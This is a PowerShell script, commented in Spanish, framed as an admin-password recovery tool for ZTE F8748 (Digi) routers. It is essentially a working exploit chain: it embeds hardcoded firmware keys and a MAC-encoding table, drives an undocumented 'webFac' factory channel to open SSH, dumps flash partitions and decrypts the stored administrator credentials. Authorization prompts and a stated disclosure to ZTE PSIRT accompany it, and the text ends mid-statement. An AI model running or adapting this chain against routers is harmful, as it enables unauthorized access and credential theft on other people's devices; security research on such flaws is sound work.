# =============================================================================
#  digi-f8748.ps1 - DIGI F8748 Admin Recovery para Windows (PowerShell 5.1+)
# =============================================================================
#  El recuperador de la contrasena de administrador para routers ZTE F8748
#  (Digi). Si estas aqui, es que la has perdido. Recuperala paso a paso,
#  sin instalar nada y sin tocar tu configuracion.
#
#  SOLO USO AUTORIZADO: usala unicamente en un router tuyo o autorizado.
#  Sin garantias: bajo tu propio riesgo.
#
#  NO SE INSTALA NADA: ni en el router (no se toca firmware, software ni
#  configuracion; solo se activa temporalmente el modo de diagnostico que
#  el firmware ya trae, y se desactiva al terminar) ni en tu equipo
#  (nada persistente). Solo aprovechamos ese diseno para que el propio
#  router muestre las credenciales de administrador que ya tiene guardadas.
#
#  Hallazgo notificado responsablemente a ZTE PSIRT (correo, 2026-09-22).
#  Autor: github.com/686f6c61
#
#  Ejecucion (desde PowerShell o doble clic en digi-f8748-ps1.bat):
#    .\digi-f8748.ps1 info                    # modelo/firmware/MACs
#    .\digi-f8748.ps1 handshake               # reto webFac (no envia prueba)
#    .\digi-f8748.ps1 recover                 # todo: arm->dump->decrypt->disarm
#    .\digi-f8748.ps1 decrypt -Dir digi-dump  # relee credenciales (offline)
#
#  Comandos con SSH (dump/recover) usan el modulo Posh-SSH: si no lo tienes,
#  el script TE PREGUNTA antes de instalarlo (PSGallery, alcance usuario).
# =============================================================================
$ErrorActionPreference = 'Stop'
$VERSION = "0.0.2"

# ------------------------- constantes del firmware ZTE -----------------------
$KEYPOOL_HEX = "9c3375d11c424537184891731745794443d7d573335476d2c5f12c4f7aba61d95c69df8cd21cde3b352d2fe1de4c77f51a65d1fe18438ea742080478d5e4f334a4d3f236476d869d42651342dc429948dc679f9edc46375f849f6f76ce794f49"
$FNV = 16777619; $MASK = 2147483711
$HDR = @("apjd", "apal", "afpe")   # h0, h1, h5767
$MAC_ENC = "lltn lleg lobz llzf llmg llbe mlbe llug lllm llav layb lltm llef lzby llzp llmf llbo mlbo llqa llll llau llya lltl llee lzbx llzo llme llbn mlbn llsh lllv llat mlat lltv lled lzbw llzn llmo llbm mlbm llsg lllu llas lawb lltu llen mlen llzm llmn llbl mlbl llsf lllt llar lawa lltt llem mlem llzl llmm llbk lazb llse llls llcy layh llts llel mlel llzk llml llbj laza llsd lllr locx llyg lltr llek mlek llzu llmk llbt mlbt llqf llfd llaz llyf llnd llae mlae llzt llmj llbs mlbs llqe llfc llay llye llnc llad mlad llzs llmt llbr mlbr llqd lllz llax llyd llle llac mlac llzr llms llbq lazh llqc llly llaw llyc llld llab mlab llzq llmr llbp lazg lloe lllx lzav llwe lllc llaa mlaa lltc llmq llbz lazf llod lllw lzau llwd lllb llak mlak llzz llmp llby llze lloc llda lzat llwc llla llaj mlaj llzy llmz llbx llzd llob llbc mlbc llwb lllk llai mlai llzx llmy llbw llzc lloa llbb mlbb llud lllj llah mlah llzw llmx llbv llzb llmc llba mlba lluc llli llag mlag llti llmw llbu llza llmb lldh mldh llub lllh llaf mlaf llth llmv lzbt llxc llma lldg lzaz llua lllg llap mlap lltg llmu lzbs llzj lloh llbi mlbi llwh lllf llao mlao lltq llgg lzbr llzi llog llbh mlbh llsb lllp llan mlan lltp llca lzdy llzh llmi llbg mlbg llsa lllo llam layd llto lleh mleh llzg llmh llbf mlbf lluh llln llal layc" -split ' '
$PARAMTAG_PREFIX = "zx279132"
$PARAMTAG_KEYHEX = "8cc72b05705d5c46f412af8cbed55aad"
$DEFAULT_VID = "108"
$HC_USER_KEY = "SSH_UserName_2009"; $HC_PASS_KEY = "SSH_PassWord_2009"
$DUMP_DEVICES = @("/dev/mtd9", "/dev/mtd8", "/dev/mtd10", "/dev/mtd7")
$PARAM_DEVICES = @("/dev/mtd1", "/dev/mtd2", "/dev/mtd3", "/dev/mtd4", "/dev/mtd5")
$DUMP_WINDOWS = @(0x980000, 0x9C0000, 0xA00000, 0xA40000, 0xA80000, 0x900000,
                  0x940000, 0xAC0000, 0xB00000, 0x800000, 0x880000)

$Host_ = "192.168.1.1"; $WebU = "user"; $WebP = "user"; $CRand = 0
$RMac = ""; $CMac = ""; $OutDir = "digi-dump"; $VUser = ""; $VPass = ""; $VidOverride = ""

function Banner {
  Write-Host ""
  Write-Host " ____ ___ ____ ___ "
  Write-Host "|  _ \_ _/ ___|_ _|"
  Write-Host "| | | | | |  _ | | "
  Write-Host "| |_| | | |_| || | "
  Write-Host "|____/___\____|___|"
  Write-Host "  ZTE F8748 (Digi) - ADMIN RECOVERY - solo uso autorizado"
  Write-Host "        digi-f8748 $VERSION - $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
}

function Die([string]$m) { Write-Host "[x] $m" -ForegroundColor Red; exit 1 }
function Log([string]$m) { Write-Host $m }

# ------------------------------ helpers de bytes -----------------------------
function Unwrap($x) {
  while ($null -ne $x -and $x -isnot [byte[]] -and $x.Count -eq 1 -and $x[0] -is [byte[]]) { $x = $x[0] }
  if ($x -isnot [byte[]]) { $x = [byte[]]$x }
  $x
}
function HexToBytes([string]$hex) {
  $b = [byte[]]::new($hex.Length / 2)
  for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
  $b
}
function BytesToHex($b) { ([System.BitConverter]::ToString((Unwrap $b))).Replace("-", "").ToLower() }
function Latin1($b) { [System.Text.Encoding]::GetEncoding(28591).GetString((Unwrap $b)) }
function Sha256Hex($b) { BytesToHex ([System.Security.Cryptography.SHA256]::Create().ComputeHash((Unwrap $b))) }
function Pad16($d) {
  $d = Unwrap $d
  $pad = 16 - ($d.Length % 16)
  $out = [byte[]]::new($d.Length + $pad)
  [Array]::Copy($d, $out, $d.Length); $out
}
function AesEcbEncrypt([byte[]]$key, $data) {
  $data = Unwrap $data
  $aes = [System.Security.Cryptography.Aes]::Create()
  $aes.KeySize = $key.Length * 8; $aes.Key = $key
  $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
  $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
  $t = $aes.CreateEncryptor(); $t.TransformFinalBlock($data, 0, $data.Length)
}
function AesCbcDecrypt([byte[]]$key, [byte[]]$iv, $data) {
  $data = Unwrap $data
  $aes = [System.Security.Cryptography.Aes]::Create()
  $aes.KeySize = $key.Length * 8; $aes.Key = $key; $aes.IV = $iv
  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
  $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
  $t = $aes.CreateDecryptor(); $t.TransformFinalBlock($data, 0, $data.Length)
}
function PkcsUnpad($d) {
  $d = Unwrap $d
  if ($d.Length -gt 0) {
    $n = $d[$d.Length - 1]
    if ($n -ge 1 -and $n -le 16) {
      $ok = $true
      for ($i = $d.Length - $n; $i -lt $d.Length; $i++) { if ($d[$i] -ne $n) { $ok = $false } }
      if ($ok) { return $d[0..($d.Length - $n - 1)] }
    }
  }
  $d
}

# ------------------------------ HTTP (HttpClient) ----------------------------
Add-Type -AssemblyName System.Net.Http
$http = [System.Net.Http.HttpClient]::new()
$http.Timeout = [TimeSpan]::FromSeconds(15)
[void]$http.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", "Mozilla/5.0")

function PostBytes([string]$url, [byte[]]$body, [int]$timeoutSec = 10) {
  $ct = [System.Net.Http.ByteArrayContent]::new($body)
  $resp = $http.PostAsync($url, $ct)
  if (-not $resp.Wait([TimeSpan]::FromSeconds($timeoutSec))) { throw "timeout POST $url" }
  $r = $resp.Result
  $read = $r.Content.ReadAsByteArrayAsync()
  $null = $read.Wait([TimeSpan]::FromSeconds($timeoutSec))
  , $read.Result
}
function GetString([string]$url) {
  $resp = $http.GetAsync($url)
  if (-not $resp.Wait([TimeSpan]::FromSeconds(15))) { throw "timeout GET $url" }
  $r = $resp.Result
  $read = $r.Content.ReadAsByteArrayAsync()
  $null = $read.Wait([TimeSpan]::FromSeconds(15))
  [System.Text.Encoding]::UTF8.GetString($read.Result)
}

# --------------------------------- MACs --------------------------------------
function CleanMac([string]$s) { ($s -replace '[:\-]', '').ToLower() }
function ResolveMacs {
  if (-not $RMac) {
    try {
      $null = New-Object System.Net.NetworkInformation.Ping
      $p = (New-Object System.Net.NetworkInformation.Ping).Send($Host_, 1000)
      if ($p.Status -eq 'Success') { $RMac = ($p.MacAddress.ToString() -replace '-', '') }
    } catch { }
  }
  if (-not $CMac) {
    foreach ($nic in [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()) {
      foreach ($ip in $nic.GetIPProperties().UnicastAddresses) {
        if ($ip.Address.AddressFamily -eq 'InterNetwork' -and $ip.Address.ToString() -like "192.168.*") {
          $m = $nic.GetPhysicalAddress().ToString().ToLower()
          if ($m -and $m -ne '020000000000' -and $m -ne '000000000000') { $CMac = $m }
        }
      }
    }
  }
  $RMac = CleanMac $RMac; $CMac = CleanMac $CMac
  if ($RMac -notmatch '^[0-9a-f]{12}$') { Die "Router MAC desconocida - pasa -RouterMac aa:bb:cc:dd:ee:ff" }
  if ($CMac -notmatch '^[0-9a-f]{12}$') { Die "Client MAC desconocida - pasa -ClientMac aa:bb:cc:dd:ee:ff" }
  $script:RMac = $RMac; $script:CMac = $CMac
  Log "[*] Router MAC (br0): $RMac"
  Log "[*] Client MAC:       $CMac"
}

# --------------------------- canal webFac (HTTP) -----------------------------
$KeyBytes = $null
function Invoke-WfInit {
  $null = PostBytes "http://$Host_/webFac" ([System.Text.Encoding]::ASCII.GetBytes("SendSq.gch")) 8
  try { $null = PostBytes "http://$Host_/webFac" ([System.Text.Encoding]::ASCII.GetBytes("RequestFactoryMode.gch")) 8 } catch { }
  $r = PostBytes "http://$Host_/webFac" ([System.Text.Encoding]::ASCII.GetBytes("SendSq.gch?rand=$CRand`r`n")) 8
  $txt = Latin1 $r
  if ($txt -notmatch 're_rand=(\d+)') { throw "webFac no devolvio re_rand" }
  $sr = [long]$Matches[1]
  $idx = ((($FNV * $CRand) -band $MASK) -bxor $sr) % 60
  $script:KeyBytes = HexToBytes $KEYPOOL_HEX
  $script:WfKey = $KeyBytes[$idx..($idx + 23)]
  Log ("[+] handshake ok: server_rand=$sr key_index=$idx key=" + (BytesToHex $WfKey))
}

function Invoke-WfSend([string]$cmd) {
  if (-not $KeyBytes) { throw "ejecuta handshake primero" }
  $enc = AesEcbEncrypt $WfKey (Pad16 ([System.Text.Encoding]::ASCII.GetBytes($cmd)))
  PostBytes "http://$Host_/webFacEntry" $enc 10
}
function Invoke-WfProof { $null = Invoke-WfSend (Get-InfoMessage); Log "[+] prueba de MACs enviada" }
function Invoke-WfLogin { $null = Invoke-WfSend "CheckLoginAuth.gch?version50&user=$WebU&pass=$WebP" }

function Get-InfoMessage {
  $G = $HDR[0] + $HDR[1] + $HDR[0] + $HDR[2]
  foreach ($hex in @($RMac, $CMac, $CMac)) {
    for ($i = 0; $i -lt 12; $i += 2) { $G += $MAC_ENC[[Convert]::ToInt32($hex.Substring($i, 2), 16)] }
  }
  "SendInfo.gch?info=22|$G"
}

function Invoke-FactoryMode([int]$mode) {
  $raw = Invoke-WfSend "FactoryMode.gch?mode=$mode&user=notused"
  if ($raw.Length % 16 -ne 0) { $raw = Pad16 $raw }
  $dec = (Latin1 (AesCbcDecrypt $WfKey (HexToBytes "00000000000000000000000000000000") $raw)) -replace "`0", ""
  if ($dec -match 'user=([^&]+)&pass=([^\x00&]+)') { return @($Matches[1], $Matches[2]) }
  if ($mode -eq 0) { return @("", "") }
  throw "FactoryMode no devolvio credenciales (fallo la prueba de MACs?)"
}

function Invoke-ArmWithRetries([int]$attempts = 3) {
  ResolveMacs
  for ($i = 1; $i -le $attempts; $i++) {
    try {
      Log "[*] Ciclo factory SSH $i/$attempts..."
      Invoke-WfInit
      try { $null = Invoke-FactoryMode 0 } catch { Log "[*] nota disarm: $($_.Exception.Message)" }
      Start-Sleep -Seconds 1.2
      Invoke-WfInit
      Invoke-WfProof
      Invoke-WfLogin
      $c = Invoke-FactoryMode 2
      if ($c[0] -and $c[1]) {
        $script:SshU = $c[0]; $script:SshP = $c[1]
        Log "[+] factory SSH armado - user: $SshU  pass: $SshP"
        return
      }
    } catch { Log "[!] intento $i fallo: $($_.Exception.Message)"; Start-Sleep -Seconds 2 }
  }
  Die "no se pudo armar el factory SSH"
}

# ------------------------------- SSH (Posh-SSH) ------------------------------
function Ensure-PoshSsh {
  if (Get-Module -ListAvailable -Name Posh-SSH) { Import-Module Posh-SSH; return }
  Log "[!] Los comandos con SSH necesitan el modulo Posh-SSH (gratuito, PSGallery)."
  $r = Read-Host "Instalar Posh-SSH ahora? [s/N]"
  if ($r -notmatch '^[sS]') { Die "instalacion cancelada. Instalalo con: Install-Module Posh-SSH -Scope CurrentUser" }
  if (-not (Get-PackageProvider -ListAvailable -Name NuGet -ErrorAction SilentlyContinue)) {
    Install-PackageProvider -Name NuGet -Scope CurrentUser -Force | Out-Null
  }
  Install-Module Posh-SSH -Scope CurrentUser -Force -Repository PSGallery
  Import-Module Posh-SSH
  Log "[+] Posh-SSH instalado"
}

function Invoke-Dump {
  Ensure-PoshSsh
  New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
  $sec = ConvertTo-SecureString $SshP -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential($SshU, $sec)
  $session = $null
  foreach ($try in 1..3) {
    try { $session = New-SSHSession -ComputerName $Host_ -Credential $cred -AcceptKey -ErrorAction Stop; break }
    catch { Log "[!] SSH intento $try fallo: $($_.Exception.Message)"; Start-Sleep -Seconds 2 }
  }
  if (-not $session) { Die "no se pudo abrir la sesion SSH" }
  $results = @{}
  try {
    $bt = (Invoke-SSHCommand -SessionId $session.SessionId -Command "cat /proc/capability/boardtype" -TimeOut 30).Output -join "`n"
    Set-Content -Path (Join-Path $OutDir "boardtype.txt") -Value $bt
    if ($bt -match 'vid\s*:\s*(\d+)') { $results['vid'] = $Matches[1] }
    Log "[+] board vid: $($results['vid'] -or 'no encontrado')"

    # paramtag
    $pt = $null
    $hex = (Invoke-SSHCommand -SessionId $session.SessionId -Command "hexdump -ve '1/1 `"%02x`"' /tagparam/paramtag" -TimeOut 120).Output -join ""
    $hex = ($hex -replace '[^0-9a-fA-F]', '')
    if ($hex.Length -ge 128 -and (HexToBytes $hex.Substring(0, 8)) -join '' -eq '54414748') { $pt = HexToBytes $hex }
    if (-not $pt) {
      foreach ($dev in $PARAM_DEVICES) {
        if ($pt) { break }
        foreach ($size in 2048, 4096, 8192, 16384) {
          $null = Invoke-SSHCommand -SessionId $session.SessionId -Command "mtd_debug read $dev 0 $size /var/tmp/digi_pt.bin" -TimeOut 60
          $h2 = (Invoke-SSHCommand -SessionId $session.SessionId -Command "hexdump -ve '1/1 `"%02x`"' /var/tmp/digi_pt.bin" -TimeOut 120).Output -join ""
          $h2 = ($h2 -replace '[^0-9a-fA-F]', '')
          $idx = $h2.IndexOf('54414748')
          if ($idx -ge 0 -and $h2.Length - $idx -ge 128) { $pt = HexToBytes $h2.Substring($idx); Log "[+] paramtag via $dev"; break }
        }
      }
    }
    if ($pt) { [IO.File]::WriteAllBytes((Join-Path $OutDir "paramtag.bin"), $pt); $results['paramtag'] = $true; Log "[+] paramtag: $($pt.Length) bytes" }
    else { Log "[!] paramtag no encontrado" }

    # seed + oss desde ventanas de flash
    $flash = [System.Collections.Generic.List[byte]]::new()
    $seed = $null; $oss = $null
    foreach ($dev in $DUMP_DEVICES) {
      $probe = (Invoke-SSHCommand -SessionId $session.SessionId -Command "mtd_debug read $dev 0 16 /var/tmp/digi_p.bin" -TimeOut 30).Output -join ""
      if ($probe -notmatch '[Cc]opied') { Log "[*] $dev no legible, saltando"; continue }
      Log "[*] escaneando ventanas de flash en $dev..."
      foreach ($chunk in 8192, 4096, 2048) {
        $flash.Clear(); $seed = $null; $oss = $null
        foreach ($off in $DUMP_WINDOWS) {
          $n = 262144 / $chunk
          for ($i = 0; $i -lt $n; $i++) {
            $o = $off + $i * $chunk
            $null = Invoke-SSHCommand -SessionId $session.SessionId -Command "mtd_debug read $dev $o $chunk /var/tmp/digi.bin" -TimeOut 90
            $h = (Invoke-SSHCommand -SessionId $session.SessionId -Command "hexdump -ve '1/1 `"%02x`"' /var/tmp/digi.bin" -TimeOut 120).Output -join ""
            $h = ($h -replace '[^0-9a-fA-F]', '')
            if ($h.Length -gt 100) { $fb = HexToBytes $h; $flash.AddRange($fb) }
            $arr = $flash.ToArray()
            if (-not $seed) { $s = Latin1 $arr; if ($s -match '([0-9a-fA-F]{48,120}v\d+\.\d+)') { $seed = $Matches[1] } }
            if (-not $oss) { $oss = Find-OssContainer $arr }
            if ($seed -and $oss) { break }
          }
          if ($seed -and $oss) { break }
        }
        if ($seed -and $oss) { break }
      }
      if ($seed -and $oss) { break }
    }
    if ($seed) { Set-Content -Path (Join-Path $OutDir "hardcode.seed") -Value "$seed`n" -NoNewline; $results['seed'] = $true; Log "[+] seed encontrada" }
    if ($oss) { [IO.File]::WriteAllBytes((Join-Path $OutDir "oss.bin"), $oss); $results['oss'] = $true; Log "[+] oss encontrado ($($oss.Length) bytes)" }
    return $results
  } finally {
    Remove-SSHSession -SessionId $session.SessionId | Out-Null
  }
}

function Find-OssContainer([byte[]]$blob) {
  $s = Latin1 $blob
  $j = $s.IndexOf("oss")
  while ($j -ge 0) {
    foreach ($from in @([Math]::Max(0, $j - 32), $j)) {
      $di = $s.IndexOf([string][char]0x85 + [string][char]0x19 + [string][char]0x02 + [string][char]0xe0, $from)
      if ($di -lt 0) { continue }
      for ($zi = $di; $zi -lt [Math]::Min($di + 300, $s.Length - 2); $zi++) {
        if ($blob[$zi] -ne 0x78) { continue }
        if ($blob[$zi + 1] -notin @(1, 0x5E, 0x9C, 0xDA)) { continue }
        try {
          $ms = [System.IO.MemoryStream]::new($blob, $zi + 2, [Math]::Min(262144, $blob.Length - $zi - 2))
          $ds = [System.IO.Compression.DeflateStream]::new($ms, [System.IO.Compression.CompressionMode]::Decompress)
          $out = [System.IO.MemoryStream]::new()
          $buf = [byte[]]::new(65536)
          while (($r = $ds.Read($buf, 0, $buf.Length)) -gt 0) { $out.Write($buf, 0, $r); if ($out.Length -gt 1048576) { break } }
          $plain = $out.ToArray()
          if ($plain.Length -ge 4 -and $plain[0] -eq 1 -and $plain[1] -eq 2 -and $plain[2] -eq 3 -and $plain[3] -eq 4) { return $plain }
        } catch { }
      }
    }
    $j = $s.IndexOf("oss", $j + 1)
  }
  $null
}

# ------------------------------ cripto offline -------------------------------
function Get-Credentials([string]$dir) {
  $seedF = Join-Path $dir "hardcode.seed"; $ossF = Join-Path $dir "oss.bin"; $ptF = Join-Path $dir "paramtag.bin"
  foreach ($f in @($seedF, $ossF, $ptF)) { if (-not (Test-Path $f)) { Die "falta $f - ejecuta dump antes" } }
  $vid = $DEFAULT_VID
  $btF = Join-Path $dir "boardtype.txt"
  if (Test-Path $btF) { $m = (Get-Content $btF -Raw) -match 'vid\s*:\s*(\d+)'; if ($m) { $vid = $Matches[1] } }
  if ($VidOverride) { $vid = $VidOverride }
  Log "[*] board vid: $vid"

  # hardcode: seed -> key/iv -> contenedor oss
  $seed = ((Get-Content $seedF -First 1) -replace "`r|`n", "")
  if ($seed.Length -lt 64) { Die "seed demasiado corta" }
  $kp = [byte[]]::new(16); $ivp = [byte[]]::new(32)
  for ($i = 0; $i -lt 64; $i++) {
    $c = [int][char]$seed[$i]
    if ($i -ge 47 -and $i -le 62) { $kp[$i - 47] = ($c + 2) -band 255 }
    if ($i -ge 2 -and $i -le 33) { $ivp[$i - 2] = ($c + 3) -band 255 }
  }
  $latin = [System.Text.Encoding]::GetEncoding(28591)
  $kstr = $latin.GetBytes($latin.GetString($kp) + $seed.Substring(64))
  if ($kstr.Length -gt 32) { $kstr = $kstr[0..31] }
  $hk = Sha256Hex $kstr; $hiv = (Sha256Hex $ivp).Substring(0, 32)
  Log "[*] hardcode key=$($hk.Substring(0,16))... iv=$($hiv.Substring(0,16))..."
  $ossBlob = [IO.File]::ReadAllBytes($ossF)
  # los campos del contenedor son big-endian (struct '>I' en el formato original)
  $be = { param($off) [int]($ossBlob[$off] * 16777216 + $ossBlob[$off + 1] * 65536 + $ossBlob[$off + 2] * 256 + $ossBlob[$off + 3]) }
  $clen = & $be 64
  if ($clen -lt 16 -or $clen -gt $ossBlob.Length - 72) { Die "cipher_len invalido: $clen" }
  $ct = $ossBlob[72..(71 + $clen)]
  $pt = PkcsUnpad (AesCbcDecrypt (HexToBytes $hk) (HexToBytes $hiv) $ct)
  $catalog = @{}
  foreach ($line in (Latin1 $pt) -split "`r?`n") {
    if ($line -match '^([^=]+)=(.*)$') { $catalog[$Matches[1].Trim()] = $Matches[2].Trim() }
  }

  # paramtag
  $mat = ("$PARAMTAG_PREFIX$vid$PARAMTAG_KEYHEX").Substring(0, 32)
  $dig = Sha256Hex ([System.Text.Encoding]::ASCII.GetBytes($mat))
  $pk = HexToBytes $dig.Substring(0, 32); $piv = HexToBytes $dig.Substring(32, 32)
  $ptBlob = [IO.File]::ReadAllBytes($ptF)
  $rows = @{}; $pos = 20
  while ($pos + 10 -le $ptBlob.Length) {
    $tagId = [int][BitConverter]::ToUInt16($ptBlob, $pos)
    $ln = [BitConverter]::ToUInt16($ptBlob, $pos + 4)
    $f6 = [BitConverter]::ToUInt16($ptBlob, $pos + 6)
    $f8 = [BitConverter]::ToUInt16($ptBlob, $pos + 8)
    if ($ln -gt 4096) { break }
    $npos = ($pos + $ln + 9) -band (-4)
    if ($f6 -eq 0 -and $f8 -eq 1) {
      $enc = [byte[]]$ptBlob[($pos + 10)..([Math]::Min($npos - 1, $ptBlob.Length - 1))]
      $use = [int][Math]::Floor($enc.Count / 16) * 16
      if ($use -ge 16) {
        $d = PkcsUnpad (AesCbcDecrypt $pk $piv $enc[0..($use - 1)])
        $zi = [Array]::IndexOf($d, [byte]0); if ($zi -ge 0) { $d = $d[0..($zi - 1)] }
        $hs = ""; foreach ($b in $d) { $c = [char]$b; if ($c -match '[0-9a-fA-F]') { $hs += $c } else { break } }
        if ($hs.Length -ge 2) {
          $hs = $hs.Substring(0, $hs.Length - $hs.Length % 2)
          try { $val = Latin1 (HexToBytes $hs) } catch { $val = Latin1 $d }
        } else { $val = Latin1 $d }
        $rows[$tagId] = $val
      }
    }
    $pos = $npos
  }

  $username = $null; $password = $null
  if ($rows.ContainsKey(0x602) -and $rows[0x602]) { $username = $rows[0x602]; $usrc = "paramtag:0x602" } else { $username = $catalog[$HC_USER_KEY]; $usrc = "hardcode:$HC_USER_KEY" }
  if ($rows.ContainsKey(0x702) -and $rows[0x702]) { $password = $rows[0x702]; $psrc = "paramtag:0x702" } else { $password = $catalog[$HC_PASS_KEY]; $psrc = "hardcode:$HC_PASS_KEY" }
  if (-not $username -or -not $password) { Die "credenciales incompletas" }
  Log "== Credenciales del admin web =="
  Log "  usuario:  $username  ($usrc)"
  Log "  password: $password  ($psrc)"
  @($username, $password)
}

# --------------------------------- comandos ----------------------------------
function Cmd-Info {
  $html = GetString "http://$Host_/"
  $dec = [System.Net.WebUtility]::HtmlDecode($html)
  $models = [regex]::Matches($dec, 'F\d{4}[A-Z]?') | ForEach-Object { $_.Value } | Sort-Object -Unique
  Log ("modelo: " + ($models -join " "))
  $tm = [regex]::Match($html, '<title>(.*?)</title>', 'Singleline')
  if ($tm.Success) { Log ("titulo: " + [System.Net.WebUtility]::HtmlDecode($tm.Groups[1].Value).Trim()) }
  foreach ($nic in [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()) {
    foreach ($ip in $nic.GetIPProperties().UnicastAddresses) {
      if ($ip.Address.AddressFamily -eq 'InterNetwork' -and $ip.Address.ToString() -like "192.168.*") {
        Log "tu IP/MAC ($($nic.Name)): $($ip.Address) / $($nic.GetPhysicalAddress())"
      }
    }
  }
  Log "[i] Router MAC = pegatina; Client MAC = la de tu equipo en la lista del router"
}

function Cmd-Handshake {
  ResolveMacs
  Invoke-WfInit
  Log "[+] prueba de MACs (22 palabras): $(Get-InfoMessage)"
  Log "[i] dry-run: NO enviada (usa arm/recover para enviarla)"
}

function Require-Auth([string]$what) {
  if ($Yes) { return }
  Write-Host "Vas a $what en $Host_."
  Write-Host "Confirma que eres el propietario del router o que tienes autorización"
  Write-Host "expresa del propietario para gestionarlo."
  $r = Read-Host "Escribe SI para continuar"
  if ($r -cne 'SI') { Die "cancelado" }
}

function Confirm-NotInGit {
  $d = (Resolve-Path $OutDir).Path
  while ($d) {
    if (Test-Path (Join-Path $d '.git')) {
      Log "[!] OJO: la carpeta de salida está dentro de un repo git. Los volcados y credenciales de tu router NO deben subirse nunca."
      if ($Yes) { return }
      $r = Read-Host "¿Continuar de todos modos? Escribe SI"
      if ($r -cne 'SI') { Die "cancelado: no se volcará nada dentro de un repo git" }
      return
    }
    $parent = Split-Path $d
    if ($parent -eq $d) { break }
    $d = $parent
  }
}

function Cmd-Arm {
  Require-Auth "activar el diagnóstico de fábrica (arm)"
  Invoke-ArmWithRetries
  if ($Keep) {
    Log "[i] -Keep: dejando el SSH abierto (recuerda desarmar)"
  } else {
    Start-Sleep -Seconds 1; Invoke-WfInit; Invoke-WfProof; Invoke-WfLogin; $null = Invoke-FactoryMode 0
    Log "[+] factory SSH desarmado"
  }
}

function Cmd-Disarm {
  ResolveMacs; Invoke-WfInit; Invoke-WfProof; Invoke-WfLogin
  $null = Invoke-FactoryMode 0
  Log "[+] factory SSH desarmado"
}

function Cmd-Dump {
  Require-Auth "armar y volcar la flash del router (dump)"
  Invoke-ArmWithRetries
  New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
  Confirm-NotInGit
  try { Invoke-Dump | Out-Null; Log "[+] dump completo en $OutDir" }
  finally {
    if (-not $Keep) {
      Log "[*] desarmando factory SSH..."
      try { Invoke-WfInit; Invoke-WfProof; Invoke-WfLogin; $null = Invoke-FactoryMode 0; Log "[+] desarmado" }
      catch { Log "[!] disarm fallo - reinicia el router si el puerto 22 sigue abierto" }
    }
  }
}

function Cmd-Decrypt { Get-Credentials $OutDir | Out-Null }

function Cmd-Verify {
  if (-not $VUser -or -not $VPass) { Die "verify necesita -VUser usuario -VPass password" }
  $j = (GetString "http://$Host_/?_type=loginData&_tag=login_entry") | ConvertFrom-Json
  $token = $j.sess_token
  if ($j.lockingTime -and [int]$j.lockingTime -gt 0) { Die "login bloqueado (lockingTime=$($j.lockingTime))" }
  $xml = GetString "http://$Host_/?_type=loginData&_tag=login_token"
  $salt = [regex]::Match($xml, '>([^<]+)</').Groups[1].Value.Trim()
  if (-not $salt) { Die "no se obtuvo salt" }
  $hash = Sha256Hex ([System.Text.Encoding]::UTF8.GetBytes("$VPass$salt"))
  $form = "action=login&Username=$([Uri]::EscapeDataString($VUser))&Password=$hash&_sessionTOKEN=$([Uri]::EscapeDataString([string]$token))"
  $content = [System.Net.Http.StringContent]::new($form, [System.Text.Encoding]::UTF8, "application/x-www-form-urlencoded")
  $resp = $http.PostAsync("http://$Host_/?_type=loginData&_tag=login_entry", $content)
  $null = $resp.Wait([TimeSpan]::FromSeconds(15))
  $body = $resp.Result.Content.ReadAsStringAsync().GetAwaiter().GetResult()
  if ($body -match 'loginErrMsg":"([^"]+)') { Die "login rechazado: $($Matches[1])" }
  $html = GetString "http://$Host_/"
  if ($html -match 'curRight\s*=\s*"1"') { Log "[+] login admin web confirmado (curRight=1)" }
  else { Log "[!] login NO confirmado" }
}

function Cmd-Recover {
  Require-Auth "ejecutar la recuperación completa (recover)"
  Invoke-ArmWithRetries
  try {
    $results = Invoke-Dump
    foreach ($k in "seed", "oss", "paramtag") { if (-not $results.ContainsKey($k)) { Die "datos incompletos (falta $k) - reinicia el router e intenta una vez" } }
    $creds = Get-Credentials $OutDir
    if (-not $NoVerify) {
      Log "[*] confirmando login web..."
      $VUser = $creds[0]; $VPass = $creds[1]
      try { Cmd-Verify } catch { Log "[!] verify: $($_.Exception.Message)" }
    }
  } finally {
    Log "[*] cerrando acceso temporal..."
    try { Invoke-WfInit; Invoke-WfProof; Invoke-WfLogin; $null = Invoke-FactoryMode 0; Log "[+] factory SSH desarmado" }
    catch { Log "[!] disarm fallo - reinicia el router si el puerto 22 sigue abierto" }
  }
}

# --------------------------------- arg parse ---------------------------------
$Cmd = $args[0]; if ($args.Count -gt 0) { $null = $args | Select-Object -First 1 }
$i = 1
while ($i -lt $args.Count) {
  switch -Regex ($args[$i]) {
    '^(-H|--host)$' { $Host_ = $args[$i + 1]; $i += 2; continue }
    '^--web-user$' { $WebU = $args[$i + 1]; $i += 2; continue }
    '^--web-pass$' { $WebP = $args[$i + 1]; $i += 2; continue }
    '^--client-rand$' { $CRand = [long]$args[$i + 1]; $i += 2; continue }
    '^--router-mac$' { $RMac = $args[$i + 1]; $i += 2; continue }
    '^--client-mac$' { $CMac = $args[$i + 1]; $i += 2; continue }
    '^(--out|--dir)$' { $OutDir = $args[$i + 1]; $i += 2; continue }
    '^(-U|--user|-VUser)$' { $VUser = $args[$i + 1]; $i += 2; continue }
    '^(-W|--password|-VPass)$' { $VPass = $args[$i + 1]; $i += 2; continue }
    '^--vid$' { $VidOverride = $args[$i + 1]; $i += 2; continue }
    '^(-K|--keep-ssh|-Keep)$' { $Keep = $true; $i++; continue }
    '^(-y|-Yes)$' { $Yes = $true; $i++; continue }
    '^--no-verify$' { $NoVerify = $true; $i++; continue }
    default { Die "argumento desconocido: $($args[$i])" }
  }
}

Banner
switch ($Cmd) {
  "info" { Cmd-Info }
  "handshake" { Cmd-Handshake }
  "arm" { Cmd-Arm }
  "dump" { Cmd-Dump }
  "decrypt" { Cmd-Decrypt }
  "verify" { Cmd-Verify }
  "disarm" { Cmd-Disarm }
  "recover" { Cmd-Recover }
  default {
